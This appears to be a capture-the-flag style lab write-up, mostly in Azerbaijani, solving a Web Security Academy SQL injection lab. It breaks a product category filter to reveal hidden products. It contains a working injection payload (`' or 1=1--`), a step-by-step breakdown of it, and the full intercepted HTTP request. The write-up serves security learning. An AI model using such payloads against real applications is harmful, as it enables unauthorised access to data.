
---

# Lab: SQL injection vulnerability in where clause allowing retrieval of hidden data
##
🎯 Problem Təsviri
Laboratoriyanın məqsədi məhsul kateqoriyası (category)filtrində mövcud olan SQL Injection zəifliyindən istifadə edərək gizli (təsdiqlənməmiş və ya silinmiş) məhsulları ekrana çıxarmaqdır.
### 🎯 Məqsəd nə idi?

Saytda məhsulları kateqoriyalara görə filtrləyən bir yer var. Biz bu hissədəki zəiflikdən istifadə edərək saytda hələ satışa çıxarılmamış və ya gizlədilmiş bütün məhsulları ekrana çıxarmalıydıq.

---

### 🛠️ Necə həll etdim? (Addım-addım)

1. **Sorğunu yaxaladım:**
* Saytda hər hansı bir kateqoriyaya kliklədim və **Burp Suite** proqramı vasitəsilə sayta gedən sorğunu (`GET /filter?category=...`) tutub saxladım.


2. **Açar sözü (Payload) yazdım:**
* Sorğunun içindəki kateqoriya hissəsinə sadə bir SQL kodu əlavə etdim: `'%20or%201=1--`


3. **Bu kod nə işə yaradı?**
* **`'` (Tək dırnaq):** Saytın arxadakı sorğusunu qəsdən qırdım (sintaksisini bağladım).
* **`%20` (Boşluq):** Brauzerlər boşluğu başa düşsün deyə araya `%20` yazdım.
* **`or 1=1`:** Verilənlər bazasına "ya bu kateqoriya olsun, ya da həmişə düz olan `1=1` şərti olsun" dedim. `1=1` həmişə düz olduğundan, sistem avtomatik olaraq **bütün** məhsulları göstərməyə məcbur qaldı.
* **`--`:** Kodun qalan hissəsini silmək/keçmək üçün şərh işarəsi qoydum.



---

### 💻 İşlətdiyim Hazır HTTP Sorğu (Request)

```http
GET /filter?category='%20or%201=1-- HTTP/2
Host: 0acd0069030e53bf8458c28d004500fe.web-security-academy.net
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="156", "Not;A=Brand";v="24", "Google Chrome";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br

```

---

### ✅ Nəticə

Bu sadə dəyişiklikdən sonra səhifə yeniləndi və gizli məhsullar ekrana çıxdı, bununla da laboratoriya uğurla tamamlandı!